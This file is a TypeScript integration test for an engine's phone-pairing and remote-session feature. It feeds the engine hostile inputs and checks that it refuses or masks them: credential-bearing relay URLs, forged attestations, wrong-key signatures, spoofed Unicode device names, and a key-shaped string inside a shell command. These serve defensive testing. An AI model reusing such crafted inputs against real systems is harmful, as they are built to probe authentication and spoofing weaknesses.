	assert.deepEqual(closed, [phone.id], "the device's sessions are closed");
	assert.deepEqual(after, [phone.id], "the next watcher is told too");
	assert.ok(logged.some((line) => line.includes("A watcher's fault.")), `the fault is logged: ${logged.join(" | ")}`);
	assert.notEqual(devicesState().devices.find((one) => one.id === phone.id)!.revokedAt, null, "and the device is revoked");
	await harness.close(context);
	step("a watcher of revocations that throws is logged, and the next watcher, pi² Remote and the device's sessions are still told");
}

// ---- A real engine, and this test as its pi² Remote

const home = mkdtempSync(join(work, "home-"));
const helperPath = join(work, "helper.sock");
const standIn = join(work, "stand-in.mjs");
writeFileSync(
	standIn,
	`import { connect, Socket } from "node:net";
const engine = new Socket({ fd: 3, readable: true, writable: true });
const test = connect(${JSON.stringify(helperPath)});
test.write(JSON.stringify({ standIn: { pid: process.pid, ppid: process.ppid } }) + "\\n");
engine.pipe(test);
test.pipe(engine);
const end = () => process.exit(0);
for (const side of [engine, test]) side.on("close", end).on("error", end);
`,
);

/** One connection from the stand-in: this test as pi² Remote. */
class Remote {
	readonly lines: string[] = [];
	readonly events: any[] = [];
	readonly sessionLines = new Map<string, any[]>();
	standIn: { pid: number; ppid: number } | null = null;
	pairing = b64url(randomBytes(16));
	macKeys = { identity: spki(p256().publicKey), channel: b64url(randomBytes(32)), record: spki(p256().publicKey), relay: spki(p256().publicKey), secureEnclave: false };
	closed = false;
	/** The longest line the engine wrote this pi² Remote, in UTF-8 bytes without its newline (#919). */
	longest = 0;
	#next = 1;
	#replies = new Map<number, (reply: any) => void>();

	readonly socket: Socket;

	constructor(socket: Socket) {
		this.socket = socket;
		// Only each new chunk is searched for a newline: a line of 64 MiB comes in a thousand chunks.
		let held: string[] = [];
		socket.setEncoding("utf8").on("data", (chunk: string) => {
			let start = 0;
			for (let newline = chunk.indexOf("\n"); newline !== -1; newline = chunk.indexOf("\n", start)) {
				held.push(chunk.slice(start, newline));
				const line = held.join("");
				held = [];
				start = newline + 1;
				this.longest = Math.max(this.longest, Buffer.byteLength(line));
				this.#heard(line);
			}
			if (start < chunk.length) held.push(chunk.slice(start));
		});
		socket
			.on("close", () => {
				this.closed = true;
				// No answer is coming to a request still waiting for one.
				for (const resolve of this.#replies.values()) resolve({ error: "pi² Remote's connection closed" });
				this.#replies.clear();
			})
			.on("error", () => {});
	}

	#heard(line: string): void {
		const message = JSON.parse(line);
		if (message.standIn !== undefined) {
			this.standIn = message.standIn;
			return;
		}
		this.lines.push(line);
		if (message.event === "remote") {
			this.events.push(message);
			// As pi² Remote does: say hello at the start, and register with the relay when asked.
			if (message.kind === "start") void this.call("remote.hello", { macKeys: this.macKeys, pairing: message.pairing, addresses: ["127.0.0.1:4242"] });
			if (message.kind === "register") void this.call("remote.state", { pairing: this.pairing });
		} else if (typeof message.session === "string") {
			this.sessionLines.set(message.session, [...(this.sessionLines.get(message.session) ?? []), message.message]);
		} else {
			this.#replies.get(message.id)?.(message);
			this.#replies.delete(message.id);
		}
	}

	call(method: string, params: Record<string, unknown> = {}): Promise<any> {
		if (this.closed) return Promise.resolve({ error: "pi² Remote's connection closed" });
		const id = this.#next++;
		const reply = new Promise<any>((resolve) => this.#replies.set(id, resolve));
		this.socket.write(`${JSON.stringify({ id, method, params })}\n`);
		return reply;
	}

	/** A device's request in a session, and its answer. */
	async inSession(session: string, method: string, params: Record<string, unknown> = {}): Promise<any> {
		const id = `${this.#next++}`;
		this.socket.write(`${JSON.stringify({ session, message: { id, method, params } })}\n`);
		return until(`the answer to ${method} in session ${session}`, () => this.sessionLines.get(session)?.find((message) => message.id === id), { over: () => (this.closed ? "pi² Remote's connection closed" : undefined) });
	}

	event(kind: string, after = 0): Promise<any> {
		return until(`a remote event ${kind}`, () => this.events.slice(after).find((event) => event.kind === kind), { over: () => (this.closed ? "pi² Remote's connection closed" : undefined) });
	}
}

const remotes: Remote[] = [];
const server = createServer((socket) => remotes.push(new Remote(socket)));
await new Promise<void>((resolve) => server.listen(helperPath, resolve));
const nextRemote = (count: number) => until(`pi² Remote number ${count}`, () => remotes.length >= count && remotes[count - 1]!.standIn !== null && remotes[count - 1]!);

class App extends EngineClient {
	readonly devicesEvents: any[] = [];
	/** Every conversation event as JSON text, for what the Mac's app is shown of a transcript (#894). */
	readonly conversationText: string[] = [];
	override receive(message: any): void {
		super.receive(message);
		if (message.event === "devices") this.devicesEvents.push(message);
		if (message.event === "conversation") this.conversationText.push(JSON.stringify(message));
	}
	notice(kind: string, after = 0): Promise<any> {
		return this.until(`a notice of ${kind}`, () => this.devicesEvents.slice(after).find((event) => event.notice?.kind === kind)?.notice);
	}
}

const env = {
	...process.env,
	PI2_HOME: home,
	PI2_KEYCHAIN_SERVICE: KEYCHAIN_SERVICE,
	PI2_APP_BUNDLE: standInApp(),
	PI2_REMOTE_STAND_IN: standIn,
	PI2_APP_ATTEST_STAND_IN: "1",
	PI2_APP_ATTEST_TEAM: "ABCDE12345",
	// Every line a device is sent here is checked for an approval deeper than the gate judges (#881).
	PI2_APPROVAL_DEPTH_THROWS: "1",
	// Its log line and its handling from a device's line or a mailbox item throw (#895): the engine must answer and carry
	// on. One a mailbox item may carry, so that both paths meet it.
	PI2_DEVICE_FAULT: "inbox.answer",
};
const main = join(import.meta.dirname, "..", "src", "main.ts");

/** Whether the engine's store holds on disk now, read beside the running engine, a devices' log entry that `matches`. */
function onDisk(matches: (entry: any) => boolean): boolean {
	const db = new DatabaseSync(join(home, "session.sqlite"), { readOnly: true });
	try {
		const rows = db
			.prepare("SELECT r.content AS text FROM document_revisions r JOIN documents d ON d.id = r.document_id WHERE d.kind = ?")
			.all(JSON.stringify("pi2.deviceLog")) as { text: string }[];
		const found = (value: unknown): boolean =>
			Array.isArray(value) ? value.some(found) : typeof value === "object" && value !== null ? matches(value) || Object.values(value).some(found) : false;
		return rows.some((row) => found(JSON.parse(row.text)));
	} finally {
		db.close();
	}
}

// ---- A handler placed in no list stops the engine before it listens

{
	const unplacedHome = mkdtempSync(join(work, "unplaced-"));
	let errors = "";
	const engine = spawn(process.execPath, [main], { env: { ...env, PI2_HOME: unplacedHome, PI2_UNPLACED_HANDLER: "made.up" }, stdio: ["ignore", "ignore", "pipe"] });
	engines.push(engine);
	engine.stderr!.setEncoding("utf8").on("data", (text: string) => (errors += text));
	const code = await new Promise<number | null>((resolve) => engine.once("exit", resolve));
	assert.notEqual(code, 0, "the engine did not start");
	const logged = existsSync(join(unplacedHome, "engine.log")) ? readFileSync(join(unplacedHome, "engine.log"), "utf8") : "";
	assert.match(errors + logged, /fatal: uncaught exception Error: Device lists in answers\.ts:\n\S* ?made\.up belongs to 0 device lists \(expected one\)/);
	assert.ok(!existsSync(join(unplacedHome, "engine.sock")), "and never listened");
	step("a handler placed in no device list stops the engine before it opens its socket");
}

// Its log, kept to check what it never holds, and shown as it comes.
let engineLog = "";
const engine = spawn(process.execPath, [main], { env, stdio: ["ignore", "ignore", "pipe"] });
engines.push(engine);
engine.stderr!.setEncoding("utf8").on("data", (text: string) => {
	engineLog += text;
	process.stderr.write(text);
});
const app = await App.connect(engine, home);
const childrenOf = (pid: number) => {
	try {
		return execFileSync("/usr/bin/pgrep", ["-P", String(pid)], { encoding: "utf8" }).trim().split("\n").filter(Boolean).map((child) => execFileSync("/bin/ps", ["-o", "command=", "-p", child], { encoding: "utf8" }).trim());
	} catch {
		return [];
	}
};
try {
	// ---- The preview off: nothing pairs, attaches or starts, and remote.* is refused on the socket
	assert.deepEqual((await app.call("devices.watch")).remote, { on: false, relay: true, home: true, direct: false, preview: false });
	await assert.rejects(app.call("devices.pairStart"), /Turn on Reach from an iPhone first/);
	await app.call("devices.set", { on: true });
	await assert.rejects(app.call("devices.pairStart"), /Turn on Reach from an iPhone first/, "remote access on, the preview off");
	for (const method of ["remote.attach", "remote.attachBegin", "remote.pairClaim", "remote.pairRefused", "remote.pairUnkept", "remote.hello", "remote.sessionEnd", "remote.pushRefused", "remote.left"]) {
		await assert.rejects(app.call(method, {}), (error: Error) => error.message === ONLY_FROM_THE_HELPER, `${method} on the socket, from a process PeerKit takes for the app`);
	}
	assert.ok(!childrenOf(engine.pid!).some((command) => command.includes(standIn)), "no pi² Remote, and no socket pair, was made");
	assert.equal(remotes.length, 0);
	// The relay's address in its one written form: pi² Remote keeps a relay key for each exact address.
	for (const spelling of ["wss://RELAY.example/v1", "wss://relay.example:443/v1", " wss://relay.example/v1", "wss://relay.example/./v1", "WSS://relay.example/v1", "wss://relay.example/v1\t"]) {
		assert.equal((await app.call("devices.set", { relayAddress: spelling })).relay, "wss://relay.example/v1", JSON.stringify(spelling));
	}
	for (const refused of ["wss://user:secret@relay.example/v1", "wss://user@relay.example/v1", "wss://relay.example./v1", "https://relay.example/v1", "ws://relay.example/v1", "wss://relay.example/v1?k=1", "not an address"]) {
		await assert.rejects(app.call("devices.set", { relayAddress: refused }), /The relay's address is wss:\/\/host\/path/, refused);
	}
	assert.equal(app.devicesEvents.at(-1).relay, "wss://relay.example/v1", "nothing refused was stored");
	await app.call("devices.set", { preview: true, relayAddress: "ws://127.0.0.1:9/v1" });
	assert.ok(!childrenOf(engine.pid!).some((command) => command.includes(standIn)), "nor with nothing paired and no pairing open");
	step("with the preview off no device can pair and no socket pair is made; remote.* is refused on the engine's socket");

	// ---- Pairing (3.1, 3.3)
	const opened = app.call("devices.pairStart");
	const remote = await nextRemote(1);
	assert.equal(remote.standIn!.ppid, engine.pid, "pi² Remote is the engine's own child, on the socket pair it made");
	const start = await remote.event("start");
	assert.deepEqual(start.devices, []);
	await remote.event("register");
	const { payload, expires } = await opened;
	const join_ = await remote.event("openJoin");
	const fields = new URL(payload).searchParams;
	assert.equal(payload.split("?")[1]!.split("&").map((pair: string) => pair.split("=")[0]).join(","), "v,p,n,c,i,r,s,u,a,e");
	const secret = Buffer.from(fields.get("s")!, "base64url");
	assert.equal(fields.get("s"), join_.secret, "pi² Remote is given s");
	assert.equal(fields.get("p"), remote.pairing);
	assert.equal(fields.get("c"), remote.macKeys.channel);
	assert.equal(fields.get("i"), remote.macKeys.identity);
	assert.equal(fields.get("u"), "ws://127.0.0.1:9/v1");
	assert.equal(fields.get("a"), "127.0.0.1:4242");
	assert.equal(Number(fields.get("e")), Math.floor(expires / 1000));
	const mac = (label: string, bound: Buffer) => createHmac("sha256", secret).update(Buffer.concat([Buffer.from(label), Buffer.from([0]), bound])).digest();
	assert.equal(join_.tokenHash, createHash("sha256").update(mac("pi2-join", Buffer.from(remote.pairing))).digest("base64url"), "the relay is given the token's hash");
	const digitsOf = (binding: Buffer) => String(mac("pi2-digits", binding).readUInt32BE(0) % 1_000_000).padStart(6, "0");

	const phone = new Phone();
	const binding = randomBytes(32);
	const macChallenge = randomBytes(32);
	const { claim } = (await remote.call("remote.pairClaim", { claim: phone.claim(remote.pairing, binding, macChallenge), binding: b64url(binding), challenge: b64url(macChallenge), path: "relay" })).result;
	assert.ok(claim);
	const notice = await app.notice("claim");
	assert.match(notice.text, /Alex's iPhone wants to pair/);
	const shown = app.devicesEvents.at(-1).pairingWindow.claim;
	assert.deepEqual(Object.keys(shown).sort(), ["at", "model", "name", "path", "replaces", "system", "wrongDigits"], "the claim is shown, its digits are not");
	const digits = digitsOf(binding);
	const wrong = digits === "000000" ? "000001" : "000000";
	await assert.rejects(app.call("devices.pairConfirm", { digits: wrong }), /not the digits the phone shows/);
	const beforePaired = remote.events.length;
	({ device: phone.id } = await app.call("devices.pairConfirm", { digits }));
	const paired = await remote.event("paired", beforePaired);
	assert.equal(paired.claim, claim);
	assert.deepEqual(paired.paired, { device: phone.id, pairing: remote.pairing, name: paired.paired.name, addresses: ["127.0.0.1:4242"] });
	assert.equal(paired.device.deviceKey, spki(phone.device.publicKey));
	await app.notice("paired");
	const listed = app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id);
	assert.equal(listed.name, "Alex's iPhone");
	assert.equal(listed.attestKeyId, phone.keyId);
	assert.ok(!app.devicesEvents.some((event) => JSON.stringify(event).includes(join_.secret)), "s is in no devices event");
	step("pairing: the code's payload to the app, s to pi² Remote alone, the claim checked and shown without its digits, paired once the digits are typed");

	// ---- One claim per window, and every other refusal closes it (3.3)
	const claimIn = async (claimer: Phone, attest: Record<string, unknown> = {}, edit: (line: any) => void = () => {}, via = remote) => {
		const opening = app.call("devices.pairStart");
		const opened = await via.event("openJoin", via.events.length);
		await opening;
		const channel = randomBytes(32);
		const challenge = randomBytes(32);
		const line = claimer.claim(remote.pairing, channel, challenge, attest);
		edit(line);
		const digits = String(createHmac("sha256", Buffer.from(opened.secret, "base64url")).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), channel])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
		return { channel, digits, reply: await via.call("remote.pairClaim", { claim: line, binding: b64url(channel), challenge: b64url(challenge), path: "home" }) };
	};
	const first = await claimIn(new Phone("Sam's iPhone"));
	assert.ok(first.reply.result.claim);
	const refusedBefore = remote.events.length;
	const second = await remote.call("remote.pairClaim", { claim: new Phone("Stranger").claim(remote.pairing, randomBytes(32), randomBytes(32)), binding: b64url(randomBytes(32)), challenge: b64url(randomBytes(32)), path: "relay" });
	assert.equal(second.error, SECOND_CLAIM, "a second claim is refused");
	const firstRefused = await remote.event("pairRefused", refusedBefore);
	assert.equal(firstRefused.claim, first.reply.result.claim, "and so is the first");
	assert.equal(firstRefused.reason, undefined, "with no word for the phone");
	await app.until("the window closed for the second claim", () => app.devicesEvents.at(-1)?.closed?.why === SECOND_CLAIM && app.devicesEvents.at(-1).pairingWindow === null);
	await assert.rejects(app.call("devices.pairConfirm", { digits: digitsOf(first.channel) }), /No phone is waiting/);
	const refusals: [string, Record<string, unknown>, (line: any) => void, RegExp][] = [
		["an attestation for other client data", { clientDataHash: b64url(randomBytes(32)) }, () => {}, /App Attest: The attestation was made for other client data/],
		["one for another app", { appId: "ZZZZZ99999.dev.pi2.ios" }, () => {}, /made for another app/],
		["one not of the stand-in's", {}, (line) => (line.attestation = b64url(randomBytes(64))), /App Attest/],
		["no attestation", {}, (line) => ((line.attestation = null), (line.keyId = null)), /no App Attest attestation/],
		["a launch validation category of 2", { validationCategory: 2 }, () => {}, /not launched as/],
		["none", { validationCategory: null }, () => {}, /not launched as/],
		["a bundle version that is not its build", { bundleVersion: "6" }, () => {}, /build is not the one the claim names/],
		["an App Attest key tied to a pairing already", { keyId: phone.keyId }, (line) => (line.keyId = phone.keyId), /tied to another pairing/],
		["a signature by another key", {}, (line) => (line.signature = signText(line.signed, p256().privateKey)), /not signed by the device key/],
		["a claim for another pairing", {}, (line) => (line.signed = JSON.stringify({ v: 2, kind: "pair", pairing: b64url(randomBytes(16)), binding: "x" })), /another pairing|another channel|not signed/],
		["a field it does not know", {}, (line) => (line.extra = true), /not a pair line/],
	];
	for (const [what, attest, edit, expected] of refusals) {
		const { reply } = await claimIn(new Phone("Pat's iPhone"), attest, edit);
		assert.match(reply.error ?? "", expected, what);
		await app.until(`the window closed after ${what}`, () => app.devicesEvents.at(-1)?.pairingWindow === null && app.devicesEvents.at(-1)?.closed?.why.startsWith("A phone's claim was refused"));
	}
	// A claimer pi² Remote refused itself, having proved the secret: the window closes as for any refused claim.
	const reopened = app.call("devices.pairStart");
	await remote.event("openJoin", remote.events.length);
	await reopened;
	assert.match((await remote.call("remote.pairRefused", { why: "anything" })).error, /why is one of not-pair, not-bound, silent, not-kept/);
	assert.deepEqual((await remote.call("remote.pairRefused", { why: "silent" })).result, {});
	await app.until("the window closed for a claimer pi² Remote refused", () => app.devicesEvents.at(-1)?.pairingWindow === null && app.devicesEvents.at(-1)?.closed?.why === "A phone's claim was refused: it went quiet.");
	assert.match((await remote.call("remote.pairRefused", { why: "not-pair" })).error, /No pairing is open/);
	// One pi² Remote could not keep on its side (#887): not the claimer's doing, and said so.
	const unkeptOpen = app.call("devices.pairStart");
	await remote.event("openJoin", remote.events.length);
	await unkeptOpen;
	assert.deepEqual((await remote.call("remote.pairRefused", { why: "not-kept" })).result, {});
	await app.until("the window closed for a pairing pi² Remote could not keep", () => app.devicesEvents.at(-1)?.closed?.why === "pi² Remote could not keep the pairing on this Mac. Start again.");
	// A claim waiting while the person cancels on the Mac: its phone is told so, in a word (#881).
	const cancelled = await claimIn(new Phone("Jo's iPhone"));
	const cancelledBefore = remote.events.length;
	await app.call("devices.pairCancel");
	const cancelledEvent = await remote.event("pairRefused", cancelledBefore);
	assert.deepEqual([cancelledEvent.claim, cancelledEvent.reason], [cancelled.reply.result.claim, "cancelled"]);
	const third = await claimIn(new Phone("Kim's iPhone"));
	assert.ok(third.reply.result.claim);
	for (let i = 0; i < 3; i++) await assert.rejects(app.call("devices.pairConfirm", { digits: wrong }));
	await app.until("the window closed after three wrong entries", () => app.devicesEvents.at(-1)?.closed?.why === "Three wrong entries. Start again.");
	await assert.rejects(app.call("devices.pairConfirm", { digits: digitsOf(third.channel) }), /No phone is waiting/);
	// A pairing the engine made and pi² Remote could not keep, taken back (#887): only the device of the last `paired`
	// this pi² Remote was sent, once; never another.
	const lost = new Phone("Lee\u202E's\uD800 iPhone");
	const lostClaim = await claimIn(lost, {}, (line) => (line.device.model = "iPhone\u200F 17\uDC00"));
	const claimEvent = await app.until("Lee's claim shown", () => app.devicesEvents.findLast((event) => event.notice?.kind === "claim" && event.pairingWindow?.claim?.name.startsWith("Lee")));
	const claimShown = claimEvent.pairingWindow.claim;
	assert.deepEqual([claimShown.name, claimShown.model, claimShown.system], ["Lee's iPhone", "iPhone 17", "iOS 27.1"], "a claim's name and model are shown as a phone shows names (#881)");
	assert.match(claimEvent.notice.text, /^Lee's iPhone wants to pair/);
	const pairedLost = remote.events.length;
	({ device: lost.id } = await app.call("devices.pairConfirm", { digits: lostClaim.digits }));
	assert.equal((await remote.event("paired", pairedLost)).device.id, lost.id);
	for (const [what, params] of [
		["an older device", { device: phone.id }],
		["no device", {}],
		["another field", { device: lost.id, also: phone.id }],
		["a device's id that is not one", { device: 7 }],
	] as const) {
		assert.match((await remote.call("remote.pairUnkept", params)).error ?? "", /may take back only the device it was last sent paired for/, what);
	}
	assert.deepEqual((await remote.call("remote.pairUnkept", { device: lost.id })).result, {});
	await app.until("the pairing taken back", () => app.devicesEvents.at(-1)?.closed?.why === NOT_KEPT && !app.devicesEvents.at(-1).devices.some((one: any) => one.id === lost.id));
	assert.match((await remote.call("remote.pairUnkept", { device: lost.id })).error ?? "", /may take back only/, "once");
	const takenBack = (await app.call("devices.log", { device: lost.id })).entries;
	assert.deepEqual(takenBack.map((entry: any) => [entry.method, entry.outcome, entry.summary]), [["pair", "failed", "Pairing of “Lee's iPhone” taken back"], ["pair", "done", "Paired"]], "the log says so, naming the phone as shown");
	assert.deepEqual(app.devicesEvents.at(-1).devices.filter((one: any) => one.revokedAt === null).map((one: any) => one.id), [phone.id], "nothing else was paired, and the first device stays");
	step(`one claim per window: a second closes it and refuses both; so do ${refusals.length} claims that fail a check, a claimer pi² Remote refused itself, a pairing it could not keep, and three wrong digits; a claim's name and model shown stripped; a pairing pi² Remote could not keep taken back, once, and no other device`);

	// ---- What remote.pairUnkept refuses (#887's security read): every other form, every other caller, every other device
	const pairNew = async (name: string, replace = false) => {
		const claimer = new Phone(name);
		const { digits } = await claimIn(claimer);
		const before = remote.events.length;
		({ device: claimer.id } = await app.call("devices.pairConfirm", { digits, ...(replace ? { replace: true } : {}) }));
		assert.equal((await remote.event("paired", before)).device.id, claimer.id);
		return claimer;
	};
	const stillPaired = (device: string) => app.devicesEvents.at(-1).devices.some((one: any) => one.id === device && one.revokedAt === null);
	const morgan = await pairNew("Morgan's iPhone");
	for (const [what, params] of [
		["a device of null", { device: null }],
		["an object", { device: { id: morgan.id } }],
		["an array", { device: [morgan.id] }],
		["a number", { device: 1 }],
		["true", { device: true }],
		["no device", {}],
		["an extra key", { device: morgan.id, also: true }],
		["parameters of null", null],
	] as const) {
		assert.match((await remote.call("remote.pairUnkept", params as never)).error ?? "", /may take back only the device it was last sent paired for/, what);
	}
	for (const [what, params] of [["parameters that are a list", [morgan.id]], ["a string", morgan.id]] as const) {
		assert.equal((await remote.call("remote.pairUnkept", params as never)).error, "Request parameters must be an object", what);
	}
	await assert.rejects(app.call("remote.pairUnkept", { device: morgan.id }), (error: Error) => error.message === ONLY_FROM_THE_HELPER, "from the Mac's app");
	await app.until("the device kept after each", () => stillPaired(morgan.id));
	// A second pairing in the same minute: only the newest can be taken back.
	const noor = await pairNew("Noor's iPhone");
	assert.match((await remote.call("remote.pairUnkept", { device: morgan.id })).error ?? "", /may take back only/, "the first of two pairings in a minute");
	assert.deepEqual((await remote.call("remote.pairUnkept", { device: noor.id })).result, {}, "the newest");
	await app.until("Noor's pairing taken back", () => !app.devicesEvents.at(-1).devices.some((one: any) => one.id === noor.id));
	await app.until("the first kept", () => stillPaired(morgan.id));
	assert.match((await remote.call("remote.pairUnkept", { device: noor.id })).error ?? "", /may take back only/, "replayed");
	// A pairing that replaced a device (Replace, 3.3 step 5), taken back: the log says which it replaced, which stays revoked.
	const morgan2 = await pairNew("Morgan's iPhone", true);
	await app.until("Morgan's old device replaced", () => !stillPaired(morgan.id));
	assert.deepEqual((await remote.call("remote.pairUnkept", { device: morgan2.id })).result, {});
	await app.until("Morgan's new pairing taken back", () => !app.devicesEvents.at(-1).devices.some((one: any) => one.id === morgan2.id));
	assert.equal((await app.call("devices.log", { device: morgan2.id })).entries[0].summary, "Pairing of “Morgan's iPhone” taken back; it had replaced “Morgan's iPhone”, which stays revoked");
	assert.notEqual(app.devicesEvents.at(-1).devices.find((one: any) => one.id === morgan.id)?.revokedAt ?? null, null, "the replaced device stays revoked");
	// A phone that attached is never taken back, whatever pi² Remote says; nor can a device ask in its session.
	const quinn = await pairNew("Quinn's iPhone");
	const quinnChannel = randomBytes(32);
	const quinnAttach = quinn.attach({ pairing: remote.pairing, challenge: (await remote.call("remote.attachBegin")).result.challenge, binding: quinnChannel });
	const quinnSession = (await remote.call("remote.attach", { attach: quinnAttach, binding: b64url(quinnChannel), path: "relay" })).result.session as string;
	assert.ok(quinnSession, "Quinn's phone attached");
	assert.equal((await remote.inSession(quinnSession, "remote.pairUnkept", { device: quinn.id })).error, ONLY_ON_THE_MAC, "from a device's session");
	assert.match((await remote.call("remote.pairUnkept", { device: quinn.id })).error ?? "", /not one pi² Remote paired this last minute/, "after the phone attached");
	await app.until("Quinn's device kept", () => stillPaired(quinn.id));
	await app.call("devices.revoke", { device: quinn.id });
	await app.until("the first device alone paired again", () => app.devicesEvents.at(-1).devices.filter((one: any) => one.revokedAt === null).map((one: any) => one.id).join() === phone.id);
	step("remote.pairUnkept refuses a device of null, an object, an array, a number, true, none, an extra key, and parameters of null, a list or a string; from the Mac's app and from a device's session; the first of two pairings in a minute; a phone that attached; and a replay; a pairing that replaced a device, taken back, says so in the log");

	// ---- Attaching, and the device's table in a session (3.4, 4.1)
	const attach = async (options: { session?: string | null; binding?: Buffer; at?: number; challenge?: string; device?: KeyObject; presence?: KeyObject | null } = {}) => {
		const challenge = options.challenge ?? (await remote.call("remote.attachBegin")).result.challenge;
		const channel = options.binding ?? randomBytes(32);
		const line = phone.attach({ pairing: remote.pairing, challenge, binding: channel, session: options.session ?? null, ...(options.at === undefined ? {} : { at: options.at }) }, options);
		return { challenge, reply: await remote.call("remote.attach", { attach: line, binding: b64url(channel), path: "relay" }) };
	};
	// An offer of a new Face ID key (#786), by this channel's pi² Remote; each field can be made wrong.
	type OfferOptions = { signer?: KeyObject; device?: KeyObject; via?: Remote; challenge?: string; signedBinding?: Buffer; pairing?: string; at?: number; build?: string; presenceKey?: string; edit?: (line: any) => void };
	const offer = async (key: ReturnType<typeof p256>, options: OfferOptions = {}) => {
		const via = options.via ?? remote;
		const challenge = options.challenge ?? (await via.call("remote.attachBegin")).result.challenge;
		const channel = randomBytes(32);
		const fields = { pairing: options.pairing ?? remote.pairing, challenge, binding: options.signedBinding ?? channel, presenceKey: options.presenceKey ?? spki(key.publicKey), ...(options.at === undefined ? {} : { at: options.at }), ...(options.build === undefined ? {} : { build: options.build }) };
		const line = phone.offer(fields, { presence: options.signer ?? key.privateKey, ...(options.device === undefined ? {} : { device: options.device }) });
		options.edit?.(line);
		return via.call("remote.presenceKey", { offer: line, binding: b64url(channel), path: "relay" });
	};
	const first_ = await attach();
	const session = first_.reply.result.session as string;
	assert.equal(first_.reply.result.resume, false);
	const greeting = await until("the greeting and the device event", () => {
		const lines = remote.sessionLines.get(session) ?? [];
		return lines.some((line) => line.event === "device") && lines;
	});
	const sent = greeting.map((line: any) => line.event);
	for (const event of ["library", "agents", "inbox", "activity", "schedules", "recovery", "usage", "chat"]) assert.ok(sent.includes(event), `the greeting sends ${event}`);
	for (const event of ["mcp", "devices", "computer", "browser", "auth", "local"]) assert.ok(!sent.includes(event), `and never ${event}`);
	const deviceEvent = greeting.find((line: any) => line.event === "device");
	assert.deepEqual(deviceEvent, { event: "device", id: phone.id, name: "Alex's iPhone", pairing: remote.pairing, mac: deviceEvent.mac, addresses: ["127.0.0.1:4242"], relay: true, revoked: false });
	await app.until("the session shown on the Mac", () => app.devicesEvents.at(-1)?.sessions.some((one: any) => one.session === session && one.device === phone.id));

	const ask = (method: string, params: Record<string, unknown> = {}) => remote.inSession(session, method, params);
	const info = (await ask("engine.info")).result;
	assert.deepEqual(info, { build: null, pid: engine.pid }, "no path of the Mac's");
	assert.ok(!("main" in info) && !("backup" in info), "neither the engine's file nor the last unfinished backup's folder");
	const appInfo = await app.call("engine.info");
	assert.ok("main" in appInfo && "backup" in appInfo, "the app is told both");
	assert.deepEqual((await ask("connection.mayAnswer")).result, { mayAnswer: false, why: "this is a paired device's session, which is never the app" });
	for (const [method, params] of [
		["agents.allowEverything", { id: "forge", on: true }],
		["providers.setKey", { id: "openai", key: "sk-x" }],
		["variables.set", { agentId: "forge", name: "X", value: "y" }],
		["devices.pairStart", {}],
		["devices.revoke", { device: phone.id }],
		["remote.attach", {}],
		["chat.continueWithAgent", { id: 1, agentId: "forge", cwd: work }],
	] as const) {
		assert.equal((await ask(method, params)).error, ONLY_ON_THE_MAC, method);
	}
	assert.deepEqual((await ask("agents.allowEverything", { id: "forge", on: false })).result, {}, "turning it off is the device's too");
	const widened = app.devicesEvents.length;
	assert.ok((await ask("usage.setBudget", { daily: 25 })).result !== undefined);
	assert.match((await app.notice("widening", widened)).text, /^Alex's iPhone: usage\.setBudget/, "the Mac is told of a request that widens");
	// An approval judged by its project's switch, through the engine's own lookup of the waiting approval: once on what
	// makeAgents holds back widens; once on an ordinary approval does not. (The merge switch is judged by the same
	// lookup; reaching it would need a pull request on GitHub's stand-in.)
	const made = await app.call("projects.create", { folder: null });
	await app.call("projects.set", { id: made.id, settings: { withoutAsking: { makeAgents: false } } });
	await app.call("conversation.open", { id: made.conversation });
	void app.call("submit", { id: made.conversation, text: `/tool project_agents ${JSON.stringify({ action: "make", settings: { name: "Temp", access: "read" } })}` });
	const switched = await app.until("the makeAgents switch's approval", () => app.events.inbox?.items?.find((item: any) => item.projectSwitch === "makeAgents"));
	const beforeSwitch = app.devicesEvents.length;
	assert.deepEqual((await ask("inbox.decide", { id: switched.id, decision: "once" })).result, {});
	assert.match((await app.notice("widening", beforeSwitch)).text, /^Alex's iPhone: Answered an approval: once/, "once past makeAgents widens");
	const { id: plain } = await app.call("conversation.create", { agentId: "forge" });
	await app.call("conversation.open", { id: plain });
	await app.call("conversation.configure", { id: plain, access: "ask", cwd: work });
	void app.call("submit", { id: plain, text: "/bash echo plain" });
	const ordinary = await app.until("an ordinary approval", () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval"));
	assert.equal(ordinary.projectSwitch, undefined);
	const beforeOrdinary = app.devicesEvents.length;
	assert.deepEqual((await ask("inbox.decide", { id: ordinary.id, decision: "once" })).result, {});
	await app.call("engine.info");
	assert.ok(!app.devicesEvents.slice(beforeOrdinary).some((event) => event.notice?.kind === "widening"), "once on an ordinary approval does not");
	// A call holding a key shape is shown to the phone in part, marked so: the phone may deny it, not allow it.
	const keyed = "sk-ant-api03-aKeyShapedStringInACommand0123456789";
	const askApproval = async (text: string, after: string[]) => {
		void app.call("submit", { id: plain, text });
		return app.until(`the approval of ${text}`, () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval" && !after.includes(item.id)));
	};
	const masked = await askApproval(`/bash echo ${keyed} | base64 -d`, [ordinary.id]);
	const shownToPhone = await until("the phone's copy of it", () =>
		remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === masked.id))?.items.find((item: any) => item.id === masked.id),
	);
	assert.equal(shownToPhone[PART_HIDDEN], true, "marked as shown in part");
	assert.ok(!JSON.stringify(shownToPhone).includes(keyed));
	// Its alert, as pushes.ts chose it for pi² Remote to seal (#689): the same mask, the same mark, never whole.
	const pushOf = (id: string) => until(`the push of ${id}`, () => remote.events.find((event) => event.kind === "push" && event.push.body?.need === id)?.push);
	const pushedMasked = await pushOf(masked.id);
	assert.deepEqual([pushedMasked.device, pushedMasked.kind, pushedMasked.body.partHidden, pushedMasked.body.whole], [phone.id, "alert", true, false]);
	assert.ok(!JSON.stringify(pushedMasked).includes(keyed) && pushedMasked.body.body.includes(KEY_HIDDEN));
	assert.equal((await ask("inbox.decide", { id: masked.id, decision: "once" })).error, HIDDEN_FROM_THE_PHONE);
	assert.equal((await ask("needs.answer", { id: masked.id, answer: { kind: "approval", decision: "once" } })).error, HIDDEN_FROM_THE_PHONE);
	assert.deepEqual((await ask("inbox.decide", { id: masked.id, decision: "deny" })).result, {}, "denying from the phone stays");
	const onTheMac = await askApproval(`/bash echo ${keyed}`, [ordinary.id, masked.id]);
